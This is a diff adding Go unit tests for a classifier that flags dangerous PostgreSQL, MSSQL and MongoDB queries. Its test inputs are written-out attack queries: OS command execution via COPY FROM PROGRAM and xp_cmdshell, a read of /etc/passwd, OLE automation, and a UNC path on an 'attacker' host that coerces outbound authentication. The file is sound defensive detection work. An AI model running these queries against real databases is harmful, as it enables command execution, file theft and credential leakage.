@@ -65,3 +65,49 @@ func TestMongoAbuseExtended(t *testing.T) {
 		}
 	}
 }
+
+func TestPostgresQueryClassifier(t *testing.T) {
+	cases := []struct{ q, anom string }{
+		{"COPY t FROM PROGRAM 'id'", "postgres-copy-program"},
+		{"CREATE FUNCTION x() RETURNS void AS $$ $$ LANGUAGE plperlu", "postgres-untrusted-plang"},
+		{"SELECT pg_read_file('/etc/passwd')", "postgres-file-access"},
+		{"SET search_path TO public,evil", "postgres-searchpath-hijack"},
+	}
+	for _, c := range cases {
+		res := Result{Meta: map[string]any{}}
+		classifyPostgresQuery(&res, c.q)
+		if !hasAnom(res, c.anom) {
+			t.Errorf("pg query %q: missing %s (%v)", c.q, c.anom, res.Meta["anomalies"])
+		}
+	}
+}
+
+func TestTSQLClassifier(t *testing.T) {
+	cases := []struct{ q, anom string }{
+		{"EXEC xp_cmdshell 'whoami'", "mssql-xp-cmdshell"},
+		{"EXEC master..xp_dirtree '\\\\attacker\\share'", "mssql-unc-coercion"},
+		{"EXEC sp_OACreate 'WScript.Shell', @o OUT", "mssql-ole-automation"},
+		{"CREATE ASSEMBLY x FROM 0x4d5a9000", "mssql-clr-assembly"},
+		{"BULK INSERT t FROM 'c:\\x'", "mssql-bulk-fileread"},
+	}
+	for _, c := range cases {
+		res := Result{Meta: map[string]any{}}
+		classifyTSQL(&res, c.q)
+		if !hasAnom(res, c.anom) {
+			t.Errorf("tsql %q: missing %s (%v)", c.q, c.anom, res.Meta["anomalies"])
+		}
+	}
+}
+
+func TestMongoDeepScan(t *testing.T) {
+	res := Result{Meta: map[string]any{}}
+	mongoDeepScan(&res, []byte("....$where....function(){return true}...."))
+	if !hasAnom(res, "mongodb-server-side-js") {
+		t.Errorf("$where not flagged: %v", res.Meta["anomalies"])
+	}
+	res2 := Result{Meta: map[string]any{}}
+	mongoDeepScan(&res2, []byte("...username...$ne...null..."))
+	if !hasAnom(res2, "mongodb-nosql-injection") {
+		t.Errorf("$ne not flagged: %v", res2.Meta["anomalies"])
+	}
+}
